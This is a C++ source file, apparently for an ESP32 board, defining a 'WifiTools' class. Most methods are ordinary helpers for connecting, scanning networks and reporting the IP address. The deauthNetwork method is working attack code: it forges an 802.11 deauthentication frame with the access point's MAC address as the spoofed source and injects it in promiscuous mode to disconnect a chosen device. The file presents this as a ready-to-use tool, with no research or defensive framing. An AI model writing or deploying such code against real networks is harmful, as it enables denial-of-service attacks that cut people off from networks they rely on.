#include "WifiTools.h"

WifiTools::WifiTools() {
    // Constructor (can initialize variables here if needed)
}

void WifiTools::connectToWiFi(const char* ssid, const char* password) {
    Serial.println("Connecting to WiFi...");
    WiFi.begin(ssid, password);

    while (WiFi.status() != WL_CONNECTED) {
        delay(1000);
        Serial.print(".");
    }

    Serial.println("\nWiFi connected!");
}

void WifiTools::scanNetworks() {
    Serial.println("Scanning for WiFi networks...");
    int networkCount = WiFi.scanNetworks(); // Start scanning for networks

    if (networkCount == 0) {
        Serial.println("No networks found.");
    } else {
        Serial.println("Networks found:");
        for (int i = 0; i < networkCount; i++) {
            Serial.print(i + 1);
            Serial.print(": ");
            Serial.print(WiFi.SSID(i));             // Network SSID
            Serial.print(" (RSSI: ");
            Serial.print(WiFi.RSSI(i));            // Signal strength
            Serial.print(" dBm) Encryption: ");
            Serial.println((WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "Encrypted");
        }
    }
    WiFi.scanDelete(); // Clean up after scanning
}

void WifiTools::deauthNetwork(const uint8_t* targetMAC, const uint8_t* apMAC) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, // Frame Control: Deauth
        0x00, 0x00, // Duration
        apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5], // Destination MAC (target)
        apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5], // Source MAC (AP)
        apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5], // BSSID (AP)
        0x00, 0x00, // Sequence Number
        0x07, 0x00  // Reason Code: Class 3 frame received from nonassociated station
    };

    // Copy the target's MAC into the destination field of the packet
    memcpy(&deauthPacket[4], targetMAC, 6);

    // Initialize WiFi in promiscuous mode
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);

    // Send deauth packet
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);

    // Disable promiscuous mode after sending
    esp_wifi_set_promiscuous(false);

    Serial.println("Deauthentication packet sent.");
}

String WifiTools::getIPAddress() {
    if (WiFi.status() == WL_CONNECTED) {
        return WiFi.localIP().toString();
    }
    return "Not connected";
}

bool WifiTools::isConnected() {
    return WiFi.status() == WL_CONNECTED;
}
